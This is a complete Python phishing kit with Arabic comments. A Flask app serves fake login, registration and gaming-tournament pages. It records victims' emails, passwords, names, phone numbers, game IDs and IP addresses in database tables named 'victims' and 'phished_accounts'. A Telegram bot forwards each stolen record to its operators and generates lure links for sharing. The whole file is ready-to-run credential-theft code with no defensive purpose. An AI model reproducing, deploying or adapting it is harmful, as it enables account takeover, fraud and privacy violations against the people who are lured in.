#!/usr/bin/env python3
import os
import json
import sqlite3
import secrets
import threading
import asyncio
import logging
from datetime import datetime
from flask import Flask, request, render_template, redirect, jsonify
from telegram import Bot
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== الإعدادات ==========
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "").split(",") if id.strip()]
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN not set")

if not ADMIN_IDS:
    logging.warning("ADMIN_IDS فارغ! لن تُرسل أي رسائل.")

# ========== Flask ==========
app = Flask(__name__, template_folder='.')

# ========== قاعدة البيانات ==========
DB_PATH = "data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # جدول الضحايا الرئيسي
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        step TEXT,
        full_name TEXT,
        phone_code TEXT,
        phone_number TEXT,
        game_id TEXT,
        email TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT
    )''')
    # جدول الحسابات (مُحدّث بعمود full_name)
    c.execute('''CREATE TABLE IF NOT EXISTS phished_accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        full_name TEXT,
        email TEXT,
        password TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def send_to_telegram(message):
    if not ADMIN_IDS:
        print("[!] لا يوجد ADMIN_IDS لإرسال الرسالة!")
        return False
    try:
        bot = Bot(token=TELEGRAM_TOKEN)
        for admin_id in ADMIN_IDS:
            bot.send_message(chat_id=admin_id, text=message, parse_mode='Markdown')
        print(f"[✓] تم الإرسال لـ {len(ADMIN_IDS)} أدمن")
        return True
    except Exception as e:
        print(f"[!] خطأ في الإرسال: {e}")
        return False

def save_phished_account(session_id, full_name, email, password, ip, ua):
    """دالة موحدة لحفظ بيانات إنشاء الحساب"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO phished_accounts (session_id, full_name, email, password, ip, user_agent, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (session_id, full_name, email, password, ip, ua, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    msg = (
        f"📝 **بيانات إنشاء حساب جديد!**\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"👤 الاسم: `{full_name or 'غير مدخل'}`\n"
        f"📧 البريد: `{email}`\n"
        f"🔑 كلمة المرور: `{password}`\n"
        f"🌐 IP: `{ip}`\n"
        f"📱 المتصفح: `{ua}`\n"
        f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    return send_to_telegram(msg)

def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO victims 
                 (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, user_agent, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
    conn.commit()
    
    # البحث عن بيانات إنشاء الحساب المرتبطة بنفس session_id
    c.execute("SELECT full_name, email, password FROM phished_accounts WHERE session_id = ? ORDER BY id DESC LIMIT 1", (session_id,))
    login_data = c.fetchone()
    conn.close()
    
    if login_data:
        acc_name, acc_email, acc_pass = login_data
    else:
        acc_name, acc_email, acc_pass = "غير موجود", "غير موجود", "غير موجود"
    
    msg = (
        f"🎯 **بيانات البطولة!**\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"👤 الاسم: `{full_name}`\n"
        f"📞 الهاتف: `{phone_code}{phone_number}`\n"
        f"🎮 ID اللعبة: `{game_id}`\n"
        f"📧 بريد البطولة: `{email}`\n"
        f"🌐 IP: `{ip}`\n"
        f"📱 المتصفح: `{ua}`\n"
        f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"🔐 **بيانات إنشاء الحساب المرتبطة:**\n"
        f"👤 الاسم: `{acc_name}`\n"
        f"📧 البريد: `{acc_email}`\n"
        f"🔑 كلمة المرور: `{acc_pass}`"
    )
    send_to_telegram(msg)

# ========== الصفحات ==========
@app.route('/')
def home():
    return "🚀 البوت يعمل!"

@app.route('/health')
def health():
    return "OK", 200

# ✅ تغيير المسارات لتجنب التضارب
@app.route('/login/<session_id>', methods=['GET', 'POST'])
def login_page(session_id):
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        # تسجيل الدخول لا يحتوي على full_name
        save_phished_account(session_id, "", email, password, ip, ua)
        return redirect(f'/tournament/{session_id}')
    return render_template('login.html', session_id=session_id)

@app.route('/register/<session_id>', methods=['GET', 'POST'])
def register_page(session_id):
    if request.method == 'POST':
        full_name = request.form.get('full_name', '').strip()
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        
        # ✅ استخدام الدالة الموحدة مع full_name
        save_phished_account(session_id, full_name, email, password, ip, ua)
        return redirect(f'/tournament/{session_id}')
    return render_template('register.html', session_id=session_id)

@app.route('/tournament/<session_id>', methods=['GET', 'POST'])
def tournament_page(session_id):
    if request.method == 'POST':
        full_name = request.form.get('full_name', '').strip()
        phone_code = request.form.get('phone_code', '')
        phone_number = request.form.get('phone_number', '').strip()
        game_id = request.form.get('game_id', '').strip()
        email = request.form.get('email', '').strip()
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        save_victim(session_id, 'completed', full_name, phone_code, phone_number, game_id, email, ip, ua)
        return render_template('thank_you.html')
    return render_template('tournament.html', session_id=session_id)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json or {}
    session_id = data.get('session_id')
    full_name = data.get('full_name', '')
    phone_code = data.get('phone_code', '')
    phone_number = data.get('phone_number', '')
    game_id = data.get('game_id', '')
    email = data.get('email', '')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    save_victim(session_id, 'ajax', full_name, phone_code, phone_number, game_id, email, ip, ua)
    return jsonify({"status": "ok"})

# ========== دوال البوت ==========
async def start(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ غير مصرح لك.")
        return
    await update.message.reply_text(
        "🔥 **بوت الإدارة v2.0**\n\n"
        "**الأوامر:**\n"
        "/link - إنشاء رابط جديد\n"
        "/list - عرض البيانات\n"
        "/stats - إحصائيات",
        parse_mode='Markdown'
    )

async def generate_link(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    session_id = secrets.token_urlsafe(8)
    # ✅ تحديث الروابط للمسارات الجديدة
    link = f"{BASE_URL}/register/{session_id}"
    await update.message.reply_text(
        f"🔗 **رابط جديد**\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🔗 الرابط: {link}\n\n"
        f"📤 شارك الرابط.",
        parse_mode='Markdown'
    )

async def list_victims(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, full_name, phone_number, game_id, email, timestamp FROM victims ORDER BY id DESC LIMIT 10")
    data = c.fetchall()
    conn.close()
    if not data:
        await update.message.reply_text("📭 لا يوجد بيانات.")
        return
    msg = "📋 **البيانات المستلمة:**\n\n"
    for v in data:
        msg += f"🆔 `{v[0]}` | 👤 {v[1]} | 📞 {v[2]} | 🎮 {v[3]} | 📧 {v[4]} | 📅 {v[5]}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def stats(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims")
    total_victims = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM phished_accounts")
    total_accounts = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(
        f"📊 **إحصائيات**\n\n"
        f"👤 إجمالي البطولات: `{total_victims}`\n"
        f"🔐 إجمالي الحسابات: `{total_accounts}`",
        parse_mode='Markdown'
    )

# ========== بناء البوت ==========
app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
app_bot.add_handler(CommandHandler("start", start))
app_bot.add_handler(CommandHandler("link", generate_link))
app_bot.add_handler(CommandHandler("list", list_victims))
app_bot.add_handler(CommandHandler("stats", stats))

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        bot = Bot(token=TELEGRAM_TOKEN)
        bot.delete_webhook()
        print("[✓] تم حذف Webhook القديم")
    except Exception as e:
        print(f"[!] فشل حذف Webhook: {e}")
    app_bot.run_polling(close_loop=False, stop_signals=False)

# ========== المدخل الرئيسي ==========
if __name__ == "__main__":
    init_db()
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
    
